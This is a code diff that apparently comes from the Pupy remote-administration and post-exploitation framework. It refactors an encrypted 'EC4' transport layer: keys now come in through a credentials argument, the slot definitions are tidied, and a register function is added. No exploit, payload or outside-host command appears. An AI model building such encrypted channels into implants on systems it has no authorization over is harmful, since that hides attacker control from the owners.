@@ -2,7 +2,10 @@
 
 """ EC4 PSK transport """
 
-__all__ = ['EC4TransportServer', 'EC4TransportClient']
+__all__ = (
+    'EC4TransportServer', 'EC4TransportClient',
+    'register'
+)
 
 from ..base import BasePupyTransport
 from .cryptoutils import RC4, SHA384, ECPV
@@ -13,28 +16,44 @@ import struct
 import time
 import random
 
+
 class EC4Transport(BasePupyTransport):
 
-    __slots__ = ('encryptor', 'decryptor', 'up_buffer')
+    __slots__ = (
+        'encoder', 'decryptor', 'up_buffer',
+        'encryptor'
+    )
 
     privkey = None
     pubkey  = None
 
+    credentials = ['SIMPLE_RSA_PRIV_KEY', 'SIMPLE_RSA_PUB_KEY']
+
     def __init__(self, *args, **kwargs):
         super(EC4Transport, self).__init__(*args, **kwargs)
-        if not self.pubkey and not self.privkey:
+
+        credentials = kwargs.get('credentials', None)
+
+        pubkey = self.pubkey
+        privkey = self.privkey
+
+        if credentials:
+            pubkey = credentials.get('SIMPLE_RSA_PUB_KEY', self.pubkey)
+            privkey = credentials.get('SIMPLE_RSA_PRIV_KEY', self.privkey)
+
+        if not pubkey and not privkey:
             raise ValueError('Public or Private key required for EC4')
 
-        if self.pubkey:
+        if pubkey:
             self.encoder = ECPV(
                 curve='brainpoolP384r1',
-                public_key=self.pubkey,
+                public_key=pubkey,
                 hash=SHA384
             )
         else:
             self.encoder = ECPV(
                 curve='brainpoolP384r1',
-                private_key=self.privkey,
+                private_key=privkey,
                 hash=SHA384
             )
 
@@ -94,8 +113,10 @@ class EC4Transport(BasePupyTransport):
         else:
             data.write_to(self.up_buffer)
 
+
 class EC4TransportServer(EC4Transport):
     __slots__ = ()
+
 
 class EC4TransportClient(EC4Transport):
     __slots__ = ()
@@ -105,3 +126,7 @@ class EC4TransportClient(EC4Transport):
         self.downstream.write(
             struct.pack('H', len(req)) + req
         )
+
+
+def register(transports):
+    transports['ec4'] = EC4TransportClient, EC4TransportServer
